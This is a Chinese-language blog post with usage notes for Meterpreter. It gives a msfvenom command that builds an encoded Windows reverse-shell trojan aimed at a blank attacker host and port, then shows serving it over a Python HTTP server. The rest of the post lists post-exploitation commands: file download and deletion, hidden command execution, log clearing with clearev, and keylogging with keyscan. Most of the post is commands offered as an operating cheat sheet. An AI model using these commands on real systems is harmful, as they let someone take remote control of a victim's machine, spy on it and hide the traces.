<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Meterpreter · GFAlisa'Blog</title><meta name="description" content="Meterpreter - GFAlisa"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://yoursite.com/atom.xml" title="GFAlisa'Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/gfalisa" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Meterpreter</h1><div class="post-info">Mar 23, 2018</div><div class="post-content"><hr>
<a id="more"></a>
<h2 id="Meterpreter使用记录"><a href="#Meterpreter使用记录" class="headerlink" title="Meterpreter使用记录"></a>Meterpreter使用记录</h2><p>以下是在Kail-Linux下进行的试验，忙额。。。。。。。。</p>
<p>生成一个test.exe的木马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxx -e x86/shikata_ga_nai -i 3 -b &apos;\x00&apos; -f exe &gt; test.exe</div></pre></td></tr></table></figure>
<p>使用python开启一个服务,端口为888</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 888</div></pre></td></tr></table></figure>
<p>常见的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.background</div><div class="line">	即可将当前的Meterpreter Shell放到后台，再次输入session -i SesssionID 即可进入指定的Meterpreter Shell界面</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">2.run</div><div class="line">	执行Meterpreter的一些脚本，以脚本checkvm来举例，此脚本主要是用来查看目标机是否是虚拟机</div><div class="line">	如果想让脚本在后台执行，也可以使用命令bgrun</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">3.irb</div><div class="line">	在meterpreter下使用Windows API编程</div><div class="line">	client.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;world&quot;,&quot;MB_OK&quot;)   在目标机弹出一个hello world</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">4.cat 查看文件内容</div><div class="line">5.cd 目标机目录切换</div><div class="line">6.lcd 本地目录切换</div><div class="line">7.download 下载文件</div><div class="line">8.edit 编辑文件</div><div class="line">9.getlwd 查看本地当前目录</div><div class="line">10.getwd 查看目标机当前目录</div><div class="line">11.mkdir 创建一个新目录</div><div class="line">12.rm 删除文件</div><div class="line">13.rmdir 删除文件夹</div><div class="line">14.search 搜索文件；search -f *.txt表示搜索出来所有的后缀为txt的文档</div><div class="line">15.upload 上传文件</div></pre></td></tr></table></figure>
<p>常见的网络命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.arp 查看arp缓存</div><div class="line">2.route 查看目标机路由信息</div><div class="line">3.ifconfig 不解释</div><div class="line">4.ipconfig 不解释</div><div class="line">5.netstat 查看靶机端口开放信息</div><div class="line">6.pwotfwd 端口转发</div></pre></td></tr></table></figure>
<p>常见的系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1.clearev 日志清除</div><div class="line">2.execute -H -i -f cmd.exe来打开一个靶机上的cmd.exe程序，-i表示进行交互</div><div class="line">3.execute -H -f notepad.exe  -H 表示隐藏</div><div class="line">4.sysinfo 查看系统信息</div><div class="line">5.reg 与注册表交互</div><div class="line">6.keyscan_start 打开键盘记录</div><div class="line">  keyscan_dump 键盘记录软件的内容转储</div><div class="line">  keyscan_stop 关闭键盘记录</div></pre></td></tr></table></figure>
</div></article></div></main><footer><div class="paginator"><a href="/2018/03/30/MD5/" class="prev">PREV</a><a href="/2018/03/23/HongCMS 3.0.0 SQL注入漏洞/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2018 <a href="http://yoursite.com">GFAlisa</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>